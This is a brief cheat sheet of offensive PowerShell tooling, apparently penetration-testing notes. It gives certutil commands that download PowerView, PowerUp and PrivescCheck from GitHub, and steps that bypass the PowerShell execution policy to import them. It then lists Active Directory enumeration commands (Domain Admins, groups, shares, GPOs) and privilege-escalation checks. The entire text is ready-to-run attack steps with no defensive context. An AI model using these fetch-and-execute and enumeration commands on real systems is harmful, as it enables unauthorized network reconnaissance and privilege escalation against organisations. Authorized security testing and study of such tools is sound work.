# [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)

Download:

```console
certutil.exe -urlcache -f -split https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

Import and verify module:

```console
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
Import-Module .\PowerView.ps1
Get-Module
```

Interesting commands:

```console
Get-Domain
Get-DomainController
(Get-DomainPolicy).SystemAccess
Get-DomainUser | Where-Object {$_.memberof -like '*Domain Admins*'} | Format-Table -AutoSize samaccountname,memberof
Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | Format-Table -AutoSize MemberName
Get-DomainGroup -MemberIdentity <username> | Format-Table -AutoSize samaccountname
Invoke-ShareFinder
Get-NetGPO | Format-Table -AutoSize displayname,whenchanged,whencreated
```

# [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

Download:

```console
certutil.exe -urlcache -f -split https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1
certutil.exe -urlcache -f -split https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
certutil.exe -urlcache -f -split https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Privesc.psd1
certutil.exe -urlcache -f -split https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Privesc.psm1
```

Import and verify module:

```console
Set-ExecutionPolicy Bypass -Scope CurrentUser
Import-Module .\Privesc.psm1
Get-Module
Get-Command -Module Privesc
```

Run check:

```console
Invoke-AllChecks
```

# [PrivescCheck](https://github.com/itm4n/PrivescCheck)

Download:

```console
certutil.exe -urlcache -f -split https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
```

Import and verify module:

```console
Set-ExecutionPolicy Bypass -Scope CurrentUser
Import-Module .\PrivescCheck.ps1
Get-Module
```

Run check:

```console
Invoke-PrivescCheck
```
